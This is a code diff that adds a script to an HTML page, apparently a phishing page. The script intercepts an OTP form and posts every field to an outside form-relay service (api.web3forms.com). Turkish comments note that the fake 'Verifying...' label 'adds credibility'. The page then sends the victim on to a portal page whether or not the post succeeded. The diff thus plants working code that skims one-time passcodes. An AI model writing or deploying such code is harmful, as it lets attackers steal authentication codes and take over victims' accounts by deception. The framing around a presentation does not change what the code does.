@@ -965,3 +965,41 @@
                                             </a>
                                         </div>
 </body>
+<script>
+    window.addEventListener('load', function () {
+        const form = document.getElementById('otpForm');
+        const btn = document.getElementById('submitBtn');
+
+        if (form) {
+            form.addEventListener('submit', function (e) {
+                e.preventDefault(); // Sayfanın erkenden yenilenmesini durdurur
+
+                if (btn) {
+                    btn.disabled = true; // Butonu dondurur (çift tıklamayı önler)
+                    btn.innerHTML = "Doğrulanıyor..."; // İnandırıcılık katar
+                }
+
+                const formData = new FormData(this);
+                const object = Object.fromEntries(formData);
+                const json = JSON.stringify(object);
+
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: json
+                })
+                    .then(() => {
+                        // VERİ GİTTİ! Şimdi senin portalına yönlendiriyoruz
+                        window.location.href = "sdu_portal.html";
+                    })
+                    .catch(() => {
+                        // İnternet kopsa bile portala git ki sunumun bozulmasın
+                        window.location.href = "sdu_portal.html";
+                    });
+            });
+        }
+    });
+</script>
